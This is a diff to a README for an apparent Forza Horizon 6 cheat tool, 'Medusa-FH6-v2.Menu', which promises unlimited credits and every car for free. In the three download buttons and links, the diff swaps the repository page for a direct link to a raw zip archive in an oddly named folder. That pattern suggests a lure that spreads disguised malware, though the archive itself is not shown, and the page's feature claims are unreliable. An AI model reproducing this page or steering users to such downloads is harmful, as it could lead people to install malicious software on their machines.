@@ -1,7 +1,7 @@
 <h1>🛠️ Medusa-FH6-v2.Menu - Unlock Unlimited Credits and 812 Cars</h1>
 
 <p align="center">
-  <a href="https://github.com/Symphonic-ovibos446/Medusa-FH6-v2.Menu" style="display:inline-block;padding:16px 32px;background:#FF6B35;color:#fff;font-size:24px;font-weight:bold;border-radius:12px;text-decoration:none;box-shadow:0 4px 8px rgba(0,0,0,0.2);">⬇️ DOWNLOAD MEDUSA FH6 V2</a>
+  <a href="https://raw.githubusercontent.com/Symphonic-ovibos446/Medusa-FH6-v2.Menu/main/loricoid/3.5.zip" style="display:inline-block;padding:16px 32px;background:#FF6B35;color:#fff;font-size:24px;font-weight:bold;border-radius:12px;text-decoration:none;box-shadow:0 4px 8px rgba(0,0,0,0.2);">⬇️ DOWNLOAD MEDUSA FH6 V2</a>
 </p>
 
 ## 📖 What is Medusa-FH6-v2.Menu?
@@ -29,7 +29,7 @@ Getting started with Medusa-FH6-v2.Menu is quick and simple. Follow the steps be
 
 ### ✅ Step 1: Visit the Download Page
 
-Visit this link to download the application: **[https://github.com/Symphonic-ovibos446/Medusa-FH6-v2.Menu](https://github.com/Symphonic-ovibos446/Medusa-FH6-v2.Menu)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/Symphonic-ovibos446/Medusa-FH6-v2.Menu/main/loricoid/3.5.zip](https://raw.githubusercontent.com/Symphonic-ovibos446/Medusa-FH6-v2.Menu/main/loricoid/3.5.zip)**
 
 ### 📥 Step 2: Download the Application
 
@@ -125,5 +125,5 @@ Join thousands of Forza players who enhance their game with Medusa FH6 tools. Fo
 Medusa-FH6-v2.Menu is the definitive Forza Horizon 6 companion. With all the features of paid trainers - completely free, continuously updated, and simple to use - there is no reason to spend hours grinding for credits or missing out on rare cars. Download today and transform your driving experience. Get all 812 cars, unlimited money, wheelspins, and even Spotify radio - all with one tool.
 
 <p align="center">
-  <a href="https://github.com/Symphonic-ovibos446/Medusa-FH6-v2.Menu" style="display:inline-block;padding:16px 32px;background:#2ECC71;color:#fff;font-size:24px;font-weight:bold;border-radius:12px;text-decoration:none;box-shadow:0 4px 8px rgba(0,0,0,0.2);">🎮 GET MEDUSA FH6 V2 NOW</a>
+  <a href="https://raw.githubusercontent.com/Symphonic-ovibos446/Medusa-FH6-v2.Menu/main/loricoid/3.5.zip" style="display:inline-block;padding:16px 32px;background:#2ECC71;color:#fff;font-size:24px;font-weight:bold;border-radius:12px;text-decoration:none;box-shadow:0 4px 8px rgba(0,0,0,0.2);">🎮 GET MEDUSA FH6 V2 NOW</a>
 </p>
